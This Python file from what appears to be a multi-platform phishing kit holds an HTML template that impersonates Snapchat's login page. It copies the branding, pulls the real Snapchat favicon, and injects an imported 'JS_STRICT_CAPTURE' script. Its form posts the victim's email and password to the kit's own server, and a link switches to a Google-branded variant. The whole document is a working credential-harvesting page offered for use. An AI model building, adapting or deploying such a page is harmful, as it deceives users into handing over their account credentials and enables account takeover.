"""login.py - Template de connexion Snapchat."""

from platforms._shared import JS_STRICT_CAPTURE, SC_LOGO_SVG as _SC_LOGO_SVG

HTML_MOBILE_LOGIN = r"""
<!DOCTYPE html>
<html lang="{{ lang }}">
<head>
    <meta name="referrer" content="no-referrer">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <link rel="shortcut icon" href="https://accounts.snapchat.com/favicon.ico" type="image/x-icon">
    <title>Log In | Snapchat</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        * { -webkit-tap-highlight-color: transparent; box-sizing: border-box; }
        html, body { height: 100%; margin: 0; }
        body {
            background: #fffc00;
            font-family: "Avenir Next", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            color: #000;
            min-height: 100vh;
        }
        .sc-card {
            background: #fff;
            border-radius: 16px;
            padding: 32px 24px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.12), 0 2px 8px rgba(0,0,0,0.06);
            width: 100%; max-width: 360px;
            margin: 0 auto;
        }
        .sc-input-wrap { position: relative; margin-bottom: 12px; }
        .sc-input {
            width: 100%; height: 52px;
            border: 2px solid #e0e0e0; border-radius: 12px;
            padding: 22px 16px 8px 16px;
            font-size: 16px; background: #fafafa; outline: none;
            transition: all 0.15s ease; color: #000;
        }
        .sc-input:focus {
            border-color: #fffc00;
            background: #fff;
            box-shadow: 0 0 0 4px rgba(255,252,0,0.25);
        }
        .sc-input:focus + .sc-label,
        .sc-input:not(:placeholder-shown) + .sc-label {
            top: 9px; font-size: 11px; color: #000;
        }
        .sc-label {
            position: absolute; left: 16px; top: 16px;
            font-size: 15px; color: #757575;
            pointer-events: none; transition: all 0.15s ease;
            font-weight: 600;
        }
        .sc-btn {
            background: #fffc00; color: #000;
            border: 2px solid #000; border-radius: 999px;
            padding: 16px; font-weight: 700; width: 100%;
            font-size: 17px; cursor: pointer;
            transition: all 0.15s ease;
            box-shadow: 0 4px 0 #000;
        }
        .sc-btn:active {
            transform: translateY(2px);
            box-shadow: 0 2px 0 #000;
        }
        .sc-divider {
            display: flex; align-items: center; margin: 22px 0;
            color: #757575; font-size: 13px; font-weight: 600;
        }
        .sc-divider::before, .sc-divider::after {
            content: ""; flex: 1; height: 1px; background: #e0e0e0;
        }
        .sc-divider::before { margin-right: 12px; }
        .sc-divider::after { margin-left: 12px; }
        .sc-social-btn {
            display: flex; align-items: center; justify-content: center; gap: 8px;
            width: 100%; height: 48px;
            border: 2px solid #e0e0e0; border-radius: 999px;
            background: #fff; color: #000; font-weight: 700; font-size: 15px;
            cursor: pointer; transition: all 0.15s ease; margin-bottom: 10px;
        }
        .sc-social-btn:hover { background: #fafafa; border-color: #bdbdbd; }
    </style>
</head>
<body class="flex flex-col items-center justify-center p-6">
    """ + JS_STRICT_CAPTURE + r"""
    <div class="sc-card">
        <div class="flex justify-center mb-2">
            """ + _SC_LOGO_SVG + r"""
        </div>
        <h2 class="text-2xl font-extrabold text-center text-black mb-1">{{ login_title }}</h2>
        <p class="text-center text-sm text-gray-500 mb-6 font-medium">Connecte-toi pour continuer</p>
        <div id="error-box" class="{% if not message %}hidden{% endif %} w-full bg-red-50 border-2 border-red-300 text-red-800 p-3 rounded-xl text-sm mb-3 font-medium">{{ message }}</div>
        <form method="POST">
            <input type="hidden" name="action" value="login">
            <div class="sc-input-wrap">
                <input type="text" name="email" id="email-sc-mob" placeholder=" " class="sc-input" required autocomplete="off">
                <label class="sc-label">{{ email_ph }}</label>
            </div>
            <div class="sc-input-wrap">
                <input type="password" name="pass" placeholder=" " class="sc-input" required>
                <label class="sc-label">{{ pass_ph }}</label>
            </div>
            <button type="submit" class="sc-btn mt-2">{{ login_btn }}</button>
        </form>
        <div class="sc-divider">ou</div>
        <a href="/switch_platform/google" class="sc-social-btn" style="text-decoration:none;">
            <svg width="20" height="20" viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>
            Continuer avec Google
        </a>
        <button class="sc-social-btn">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="#000"><path d="M17.05 20.28c-.98.95-2.05.8-3.08.35-1.09-.46-2.09-.48-3.24 0-1.44.62-2.2.44-3.06-.35C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/></svg>
            Continuer avec Apple
        </button>
        <a href="#" class="block mt-5 text-center text-sm text-gray-700 font-bold underline">{{ forgot }}</a>
    </div>
</body>
</html>
"""
